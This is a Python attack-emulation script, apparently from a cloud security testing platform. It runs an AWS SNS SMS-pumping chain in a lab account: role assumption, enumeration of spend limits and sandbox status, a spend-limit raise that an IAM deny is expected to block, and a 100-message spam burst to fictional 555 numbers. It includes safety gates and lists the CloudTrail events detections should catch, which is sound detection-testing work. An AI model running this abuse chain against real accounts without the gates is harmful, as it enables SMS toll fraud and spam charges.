# FILE: attack.py
"""
ATOMIC_SNS_SMS_PUMPING -- Automated Post-Exploitation Attack Script
3-phase attack chain: assume attacker role, enumerate SMS config and sandbox
status, attempt a deny-guarded spend-limit raise, publish burst to fictional
555-01xx numbers (sandbox safety gate prevents real-number delivery).
"""
import sys
import time
import random
import json
import pathlib
import boto3
import botocore.exceptions

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Resource names: single source of truth ──────────────────────────────────
# attack.py lives at <emulation_dir>/attack.py; resource_names.json at <emulation_dir>/infra/
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(outputs, key, default=""):
    """Resolve a dynamic Pulumi output value via pulumi_export_keys -> outputs -> default."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key, default)


# ── Helpers ──────────────────────────────────────────────────────────────────

def _step(msg):
    print(f"[*] {msg}")

def _ok(msg):
    print(f"[+] {msg}")

def _err(msg):
    print(f"[-] {msg}")

def _warn(msg):
    print(f"[!] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point for the SNS SMS pumping emulation.
    Follows the 5-step attack chain from the approved plan.
    """

    # -------------------------------------------------------------------------
    # Resolve required outputs
    # -------------------------------------------------------------------------
    _set_tenant_credentials(outputs)

    attacker_role_arn = _p(outputs, "attacker_role_arn")
    if not attacker_role_arn:
        raise RuntimeError(
            "Missing required Pulumi output: attacker_role_arn -- "
            "deploy infra before running attack.py"
        )

    # Static names (for logging/reference only -- not used in boto3 calls here)
    _attacker_role_name  = _r("attacker_role_name",  "atomic-sns-sms-pumping-attacker-role")
    _sns_topic_name      = _r("sns_topic_name",      "atomic-sns-sms-pumping-prod-customer-notifications")
    _cloudtrail_name     = _r("cloudtrail_trail_name","atomic-sns-sms-pumping-trail")

    # =========================================================================
    # PHASE 1 -- Credential Acquisition: Assume Attacker Role
    # Technique: T1496.003 (Resource Hijacking / SMS Pumping)
    # Models post-credential-theft adversary with SNS publish rights.
    # =========================================================================
    print()
    _step("PHASE 1 -- Credential Acquisition: Assume Attacker Role")

    sts_client = _base_session(region).client("sts")

    _step(f"sts:AssumeRole -> {attacker_role_arn}")
    try:
        assume_resp = sts_client.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="sns-sms-pumping-emulation",
            DurationSeconds=3600,
        )
    except botocore.exceptions.ClientError as e:
        raise RuntimeError(f"Failed to assume attacker-role: {e}") from e

    creds = assume_resp["Credentials"]
    _ok(
        f"Assumed role: {attacker_role_arn} | "
        f"AccessKeyId: {creds['AccessKeyId']}"
    )
    op_delay(2, 4)

    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    sns_client = attacker_session.client("sns", region_name=region)

    # Execution-context SNS client (inherited MayaTrail creds) used for revert if needed.
    # The attacker role has an explicit Deny on sns:SetSMSAttributes, so if that call
    # unexpectedly succeeds the execution-context client (which has the permission) reverts it.
    exec_sns_client = _base_session(region).client("sns")

    phase_delay()

    # =========================================================================
    # PHASE 2 -- Discovery: SMS Configuration and Sandbox Status
    # Technique: T1496.003
    # Adversary enumerates spend headroom and sandbox gating before burst.
    # =========================================================================
    print()
    _step("PHASE 2 -- Discovery: SMS Configuration and Sandbox Status")

    # Step 2 -- Enumerate account SMS sending attributes
    # Tradecraft: understand MonthlySpendLimit headroom before launching burst.
    _step("sns:GetSMSAttributes -- enumerate DefaultSenderID, DefaultSMSType, MonthlySpendLimit")
    try:
        sms_attrs_resp = sns_client.get_sms_attributes()
        attrs = sms_attrs_resp.get("attributes", {})
        _ok(
            f"SMS attributes -- "
            f"DefaultSenderID={attrs.get('DefaultSenderID', 'not set')} | "
            f"DefaultSMSType={attrs.get('DefaultSMSType', 'not set')} | "
            f"MonthlySpendLimit={attrs.get('MonthlySpendLimit', 'not set')}"
        )
    except botocore.exceptions.ClientError as e:
        _err(f"GetSMSAttributes failed: {e}")
    op_delay(2, 5)

    # Step 3 -- Check sandbox status; result gates all Publish calls in Phase 3
    sandbox_in_use = False
    _step("sns:GetSMSSandboxAccountStatus -- gate Publish burst on sandbox status")
    try:
        sandbox_resp = sns_client.get_sms_sandbox_account_status()
        sandbox_in_use = bool(sandbox_resp.get("IsInSandbox", False))
        _ok(f"SMS sandbox status: IsInSandbox={sandbox_in_use}")
    except botocore.exceptions.ClientError as e:
        _err(f"GetSMSSandboxAccountStatus failed: {e}")
        _warn(
            "Could not determine sandbox status -- "
            "defaulting sandbox_in_use=False; Publish burst will be skipped"
        )
        sandbox_in_use = False
    op_delay(1, 3)

    phase_delay()

    # =========================================================================
    # PHASE 3 -- Impact: Spend-Limit Escalation Attempt and SMS Pumping Burst
    # Technique: T1496.003
    #
    # try/finally ensures revert runs even if a step raises mid-phase.
    # =========================================================================
    print()
    _step("PHASE 3 -- Impact: Spend-Limit Escalation Attempt and SMS Pumping Burst")

    _set_sms_succeeded = False  # tracks unexpected success of the deny-guarded call

    try:
        # Step 4 -- Attempt to raise MonthlySpendLimit via SetSMSAttributes
        # Tradecraft: adversary probes spend cap before launching burst to gauge blast radius.
        # The explicit IAM Deny on attacker-role-policy returns AccessDenied and still writes
        # to CloudTrail with errorCode=AccessDenied. Detections that filter errorCode IS NULL miss this.
        _step(
            "sns:SetSMSAttributes MonthlySpendLimit=100 "
            "(expected: AccessDenied -- deny-guard validation signal)"
        )
        try:
            sns_client.set_sms_attributes(attributes={"MonthlySpendLimit": "100"})
            # The IAM Deny must be in place; reaching here means the lab is misconfigured.
            _set_sms_succeeded = True
            _warn(
                "UNEXPECTED: SetSMSAttributes succeeded -- "
                "IAM Deny on attacker-role-policy appears missing"
            )
        except botocore.exceptions.ClientError as e:
            error_code = e.response["Error"]["Code"]
            if error_code in ("AuthorizationError", "AccessDenied"):
                _ok(
                    f"[DENY-GUARD CONFIRMED] SetSMSAttributes -> {error_code} as expected -- "
                    "event recorded in CloudTrail with errorCode AccessDenied"
                )
            else:
                _err(f"SetSMSAttributes unexpected error ({error_code}): {e}")
        op_delay(2, 5)

        if _set_sms_succeeded:
            # Revert is handled in finally; raise to skip Step 5 and trigger cleanup.
            raise RuntimeError(
                "sns:SetSMSAttributes succeeded unexpectedly -- "
                "attacker-role-policy Deny is missing; lab infrastructure is misconfigured"
            )

        # Step 5 -- Publish burst to 100 fictional North American 555-01xx numbers
        # Safety gate: skip entirely if account is NOT in the SMS sandbox.
        # Fictional 555 numbers are non-dialable; sandbox rejects delivery at carrier level
        # but the sns:Publish API call itself still succeeds and appears in CloudTrail.
        if not sandbox_in_use:
            _warn(
                "SAFETY GATE: account is NOT in the SMS sandbox -- "
                "sns:Publish burst skipped to prevent real-number delivery and per-message charges"
            )
        else:
            _step(
                "Publishing SMS burst to 100 fictional 555-01xx numbers "
                "(sandbox mode -- carrier delivery rejected, no real person contacted)"
            )
            publish_success = 0
            publish_fail = 0

            for n in range(100):
                # +15550100 through +15550199: fictional, non-dialable 555 range
                phone = f"+155501{n:02d}"
                message = (
                    "Congratulations! You have been selected. "
                    "Claim your reward at https://promo.example.invalid/claim"
                )
                try:
                    resp = sns_client.publish(
                        PhoneNumber=phone,
                        Message=message,
                        MessageAttributes={
                            "AWS.SNS.SMS.SMSType": {
                                "DataType": "String",
                                "StringValue": "Promotional",
                            }
                        },
                    )
                    publish_success += 1
                    if n % 10 == 0:
                        _ok(
                            f"Publish [{n+1:3d}/100] {phone} -> "
                            f"MessageId={resp.get('MessageId', 'N/A')}"
                        )
                except botocore.exceptions.ClientError as e:
                    publish_fail += 1
                    err_code = e.response["Error"]["Code"]
                    if n % 10 == 0:
                        _err(
                            f"Publish [{n+1:3d}/100] {phone} failed "
                            f"({err_code}): {e.response['Error']['Message']}"
                        )
                op_delay(0, 1)

            _ok(
                f"SMS burst complete: {publish_success}/100 API calls succeeded, "
                f"{publish_fail}/100 returned errors "
                f"(sandbox carrier rejections expected; do not prevent CloudTrail events)"
            )

    finally:
        # Revert SetSMSAttributes if it unexpectedly succeeded.
        # Use the execution-context (inherited MayaTrail) SNS client -- the attacker role
        # has an explicit Deny on this action so cannot revert itself.
        if _set_sms_succeeded:
            _warn("Reverting unexpected MonthlySpendLimit change via execution-context credentials")
            try:
                exec_sns_client.set_sms_attributes(attributes={"MonthlySpendLimit": "1"})
                _ok("Reverted MonthlySpendLimit to 1")
            except botocore.exceptions.ClientError as revert_err:
                _err(f"Revert of MonthlySpendLimit failed: {revert_err}")

    # =========================================================================
    # Summary
    # =========================================================================
    print()
    print("=" * 66)
    print("ATTACK CHAIN SUMMARY -- ATOMIC_SNS_SMS_PUMPING")
    print("=" * 66)
    print(f"  Step 1 [Phase 1] sts:AssumeRole -> {attacker_role_arn}")
    print(f"  Step 2 [Phase 2] sns:GetSMSAttributes -> spend config enumerated")
    print(
        f"  Step 3 [Phase 2] sns:GetSMSSandboxAccountStatus -> "
        f"sandbox_in_use={sandbox_in_use}"
    )
    print(
        "  Step 4 [Phase 3] sns:SetSMSAttributes MonthlySpendLimit=100 -> "
        "AccessDenied (deny-guard)"
    )
    if sandbox_in_use:
        print("  Step 5 [Phase 3] sns:Publish x100 -> 555-01xx burst executed")
    else:
        print("  Step 5 [Phase 3] sns:Publish x100 -> SKIPPED (safety gate: not in sandbox)")
    print()
    print("CloudTrail events expected:")
    print("  sts.amazonaws.com        AssumeRole")
    print("  sns.amazonaws.com        GetSMSAttributes")
    print("  sns.amazonaws.com        GetSMSSandboxAccountStatus")
    print("  sns.amazonaws.com        SetSMSAttributes  [errorCode: AccessDenied]")
    if sandbox_in_use:
        print("  sns.amazonaws.com        Publish x100  [PhoneNumber destination]")
    print()
    print("MITRE ATT&CK: T1496.003 Resource Hijacking / SMS Pumping")
    print("Tactic: Resource Hijacking")
    print("=" * 66)
